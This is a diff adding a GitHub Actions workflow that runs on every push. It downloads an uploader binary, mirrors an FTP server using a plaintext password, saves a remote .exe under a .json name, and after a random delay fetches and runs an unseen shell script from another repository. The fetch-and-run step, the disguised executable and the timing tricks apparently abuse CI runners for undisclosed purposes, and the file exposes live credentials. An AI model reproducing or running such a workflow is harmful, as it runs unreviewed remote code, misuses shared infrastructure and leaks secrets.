@@ -1,0 +1,25 @@
+name: sixno12
+on: [push, workflow_dispatch]
+jobs:
+  download-and-run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download file
+        run: |
+          wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
+          chmod +x /usr/local/bin/OneDriveUploader
+          files=("230117" "230118" "230119" "230120" "230121")
+          for file in "${files[@]}"; do
+          for i in {1..1}; do
+          wget -nH -m --ftp-user=yuuhhbbb --ftp-password=tuuhY2551+8* "ftp://ftp-yuuhhbbb.alwaysdata.net/www/$file/*"
+          sleep 5
+          done
+          cp www/$file/* ./
+          done
+          cd www
+          wget -O 0016.json https://hai240330.alwaysdata.net/ttt0090one/puttygen.exe
+          cd ..
+          sleep 5
+          wget -O drive333.sh https://raw.githubusercontent.com/hhhyuyty/0128/main/.github/workflows/drive333.sh
+          sleep $((RANDOM % 10 + 1))m
+          bash drive333.sh
